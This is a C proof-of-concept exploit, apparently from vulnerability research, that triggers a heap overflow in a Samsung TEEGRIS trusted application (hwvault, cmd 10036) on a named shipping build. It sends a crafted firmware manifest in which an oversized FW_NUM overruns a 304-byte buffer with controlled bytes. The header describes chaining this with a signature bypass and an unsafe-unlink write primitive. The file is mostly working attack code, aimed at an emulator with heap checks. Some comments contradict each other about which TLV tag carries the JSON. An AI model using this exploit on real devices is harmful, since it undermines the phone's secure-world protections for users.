/*
 * ============================================================================
 * HvAUtW (hwvault) cmd 10036 = HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST
 *   CRITICAL S1 -- in-TA reproduction of the FW_NUM heap overflow, driven
 *   end-to-end over the :1337 TEEC protocol against the SHIPPING build
 *   S921BXXSFDZE1 (the build the RE writeups target; the code is ABSENT from
 *   the bundled S9BYH2 corpus -- build delta).
 * ============================================================================
 *
 * FINDING (RE/samsung_teegris/hvautw.md, finding #4, lines 345-381):
 *   swd_hv_strong_check_manifest_signature @0x17B5C inlines the manifest JSON
 *   parser. It OPENSSL_malloc(304)s a FIXED record buffer (0x17BF8
 *   "mov w0,#0x130; bl OPENSSL_malloc"), then loops FW_NUM = atoi(JSON
 *   "FW_NUM") times (0x17CB8 atoi), 60-byte stride per image
 *   (0x17D28 "mov w8,#0x3c"), hex-decoding each image's "HASH" (<=0x60 hex
 *   chars => <=48 bytes, gate at 0x17DA4) into buf + 60*i + 24. Image i=4
 *   already writes 24+240=264..312 -> past the 304-byte chunk. Attacker
 *   controls the HASH bytes => controlled LINEAR HEAP OVERFLOW, before the
 *   (separately-bypassed, finding #1) ECDSA verify. Both chunks are
 *   OPENSSL_free'd on every path -> feeds the libtzsl unsafe-unlink WWW
 *   (RE finding 4d/4e; standalone WWW PoC scripts/exploit/hvautw_unlink_poc.py).
 *
 * I RE-DERIVED the param/TLV layout in THIS binary (not transcribed):
 *   - TA_InvokeCommandEntryPoint @0xA628: "cmp w2,#0x65" => param_types must
 *     be 0x65 = TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_INOUT, NONE, NONE), and
 *     both memrefs must pass TEES_IsREESharedMemory. Then tail-calls
 *     tz_process_command @0xFD7C with (in_buf, in_len, out_buf, out_len).
 *   - tz_process_command extracts the cmd_id (first u32 of the input MEMREF)
 *     and dispatches; cmd 10036 -> hv_secnvm_update_fw_with_manifest @0x10B0C.
 *   - The handler's TLV deserialiser (sub_F7DC) item wire format is
 *     [u32 tag][u32 len][len bytes] for a bytes item (tag hi byte 0x02), and
 *     [u32 tag][u32 value] for a scalar (tag hi byte 0x01); the envelope is
 *     [u32 cmd_id][u32 payload_len L][items...], with L == total-8 enforced.
 *   - @0x10B0C the handler fetches (via sub_D084) tags 0x010000D6 / 0x010000D8
 *     (scalars) and 0x020000DC / 0x020000DD (bytes). The bytes item
 *     **tag 0x020000DC** is the one whose data+len are loaded at 0x10D18
 *     ("ldp x1,x0,[sp,#24]") and passed as (x0=manifest, x1=len) into
 *     swd_hv_strong_check_manifest_signature @0x17B5C. => the JSON manifest
 *     blob rides in TLV item 0x020000DC.
 *
 * MANIFEST JSON GRAMMAR (RE-derived from the parser @0x17C80..0x17E00 and the
 * key-extractor sub_19044 which does strstr(key)->strchr(':')->optional
 * '"'-quoted value):
 *     {"FW_NUM":"<count>","FW_IMAGE_LIST":[
 *        {"IMAGE_TYPE":"<8>","IMAGE_VERSION":"<n>","HASH":"<<=96 hex>"}, ... ]}
 *   FW_NUM is the loop bound; we set it large and supply that many image
 *   objects each carrying a full 96-hex (48-byte) HASH of marker bytes. The
 *   5th+ image's HASH lands past the 304-byte chunk => the heap OOB write that
 *   asan (emulate/asan.py redzones around OPENSSL_malloc/TEE_Malloc) is built
 *   to catch.
 *
 * EXPECTED SIGNAL: asan "out-of-bound write" around the 304-byte chunk inside
 * the manifest parse loop -> CRASH_PC. If instead we see a clean return or an
 * earlier halt, the exact halt location is the deliverable (documented in
 * RE/emulation/hvautw_sfdze1_attempt.md), NOT a fabricated success.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

#define HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST  10036u
/* The cmd-10036 get_items (sub_D084 @0x10BF0) fetches FOUR mandatory TLV items
 * (each with a non-null out slot, so each is required or get_items returns 6):
 *   scalar 0x010000D6, scalar 0x010000D8, bytes 0x020000DC, bytes 0x020000DD.
 * The JSON manifest blob is bytes item 0x020000DC (its data/len are passed to
 * swd_hv_strong_check_manifest_signature @0x17B5C). The others are the SECNVM
 * firmware-update envelope fields (image size / version / fw-data); we supply
 * benign placeholders so get_items succeeds and execution reaches the parser.
 * Beyond get_items, the handler makes two more single-item reads:
 *   scalar 0x010000DE (@0x10C64) = transfer_unit_size  ("read fail" line 162)
 *   scalar 0x010000D7 (@0x10C84) = body_size           ("read fail" line 168)
 * and enforces start_pos(0x010000D8) < manifest_len (@0x10C50 "Invalid start
 * position"). So SIX items total must be present for execution to reach the
 * malloc(304) + FW_NUM parse loop @0x17B5C. */
#define HV_TAG_S_D6      0x010000D6u   /* scalar (image index / id) */
#define HV_TAG_BODYSIZE  0x010000D7u   /* scalar body_size */
#define HV_TAG_STARTPOS  0x010000D8u   /* scalar start_pos (< manifest_len) */
#define HV_TAG_XFERUNIT  0x010000DEu   /* scalar transfer_unit_size */
#define HV_TAG_MANIFEST  0x020000DCu   /* bytes -> verify(x0) = the JSON manifest */
#define HV_TAG_FWDATA    0x020000DDu   /* bytes item #2 (fw-data blob) */

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

static inline void put_u32(uint8_t *p, uint32_t v){ memcpy(p, &v, 4); }

/* Build the malicious manifest JSON. FW_NUM and #images are both attacker-set;
 * IMAGES>=6 with full HASHes guarantees the i>=4 OOB write. */
static int build_manifest(char *buf, int cap, int n_images)
{
    int o = 0;
    /* RE-derived key order in swd_hv_strong_check_manifest @0x17C58:
     *   "K250_VERSION" (extracted first, maxlen 4) -> "FW_NUM" (atoi, loop bound)
     *   -> "FW_IMAGE_LIST" '[' -> per image {"IMAGE_TYPE","IMAGE_VERSION","HASH"}. */
    o += snprintf(buf+o, cap-o,
        "{\"K250_VERSION\":\"1\",\"FW_NUM\":\"%d\",\"FW_IMAGE_LIST\":[", n_images);
    for (int i = 0; i < n_images; i++) {
        /* 96 hex chars = 48 bytes (the max the <=0x60 gate allows); marker
         * byte 0x41+i per image so an OOB write is visually identifiable. */
        char hash[97];
        for (int k = 0; k < 96; k += 2) {
            int hi = (0x41 + i) >> 4, lo = (0x41 + i) & 0xf;
            hash[k]   = "0123456789abcdef"[hi];
            hash[k+1] = "0123456789abcdef"[lo];
        }
        hash[96] = 0;
        o += snprintf(buf+o, cap-o,
            "%s{\"IMAGE_TYPE\":\"SPU_FW%02d\",\"IMAGE_VERSION\":\"%d\",\"HASH\":\"%s\"}",
            i ? "," : "", i, 100 + i, hash);
    }
    o += snprintf(buf+o, cap-o, "]}");
    return o;
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-487641557457";   /* HvAUtW (hwvault) */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to HvAUtW (hwvault) SFDZE1 with TEEC_LOGIN_PUBLIC\n");

    /* ----- build the malicious manifest JSON ----- */
    static char manifest[8192];
    int n_images = 8;   /* >=6 to overflow the 304-byte chunk (first OOB at i=4) */
    int mlen = build_manifest(manifest, sizeof(manifest), n_images);
    printf("[*] manifest JSON (%d bytes, FW_NUM=%d images): %.120s...\n",
           mlen, n_images, manifest);

    /* ----- wrap it in the TLV envelope for cmd 10036 -----
     * [u32 cmd_id][u32 payload_len L][u32 tag=MANIFEST][u32 len=mlen][JSON] */
    uint8_t *in  = (uint8_t*)allocate_param_mem(&context, 0x4000);  /* MEMREF_INPUT */
    uint8_t *out = (uint8_t*)allocate_param_mem(&context, 0x1000);  /* MEMREF_INOUT */
    if (!in || !out) { printf("[!] allocate_param_mem failed\n"); exit(-1); }

    /* Lay out all four required TLV items after the 8-byte [cmd_id][len] header.
     * Wire format: scalar = [u32 tag][u32 value]; bytes = [u32 tag][u32 len][bytes]. */
    uint8_t fwdata[64];  memset(fwdata, 0, sizeof(fwdata));
    uint32_t off = 8;    /* start of items (after cmd_id + payload_len) */
    /* --- four scalar items --- */
    put_u32(in + off, HV_TAG_S_D6);     put_u32(in + off + 4, 0);   off += 8;
    put_u32(in + off, HV_TAG_BODYSIZE); put_u32(in + off + 4, 16);  off += 8;   /* body_size */
    put_u32(in + off, HV_TAG_STARTPOS); put_u32(in + off + 4, 0);   off += 8;   /* start_pos=0 < mlen */
    put_u32(in + off, HV_TAG_XFERUNIT); put_u32(in + off + 4, 64);  off += 8;   /* transfer_unit_size */
    /* bytes 0x020000DC = signed-data blob (NOT the JSON). PROBE @0x17B5C proved
     * the verify function parses its SECOND arg (x23 = the 0x020000DD item) as
     * the JSON, so 0x020000DC is the other (signature-covered) blob. */
    put_u32(in + off, HV_TAG_MANIFEST); put_u32(in + off + 4, sizeof(fwdata));
    memcpy(in + off + 8, fwdata, sizeof(fwdata)); off += 8 + sizeof(fwdata);
    /* bytes 0x020000DD = the malicious JSON manifest (this is what gets parsed) */
    put_u32(in + off, HV_TAG_FWDATA); put_u32(in + off + 4, (uint32_t)mlen);
    memcpy(in + off + 8, manifest, mlen); off += 8 + (uint32_t)mlen;

    uint32_t req_len = off;                 /* total request size */
    uint32_t L = req_len - 8;               /* payload_len = total - 8 (env invariant) */
    put_u32(in + 0, HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST);  /* cmd_id */
    put_u32(in + 4, L);                                         /* payload_len */

    printf("[*] TLV envelope: cmd_id=10036, payload_len=%u, 4 items (manifest %d B), total=%u\n",
           L, mlen, req_len);
    DumpHex(in, 48, in);

    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);  /* wire 0x65 */
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = 0x4000;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = 0x1000;

    printf("[*] invoking GP cmd 10036 (manifest update) ptypes=0x%x ...\n", op.paramTypes);
    res = TEEC_InvokeCommand_impl(&session, HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST,
                                  &op, &err_origin);
    printf("[*] cmd 10036 returned 0x%x (origin 0x%x)\n", res, err_origin);
    printf("[*] (if the emulator survived to here, read the emulator log for the\n"
           "    asan heap-OOB-write inside swd_hv_strong_check_manifest_signature)\n");

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
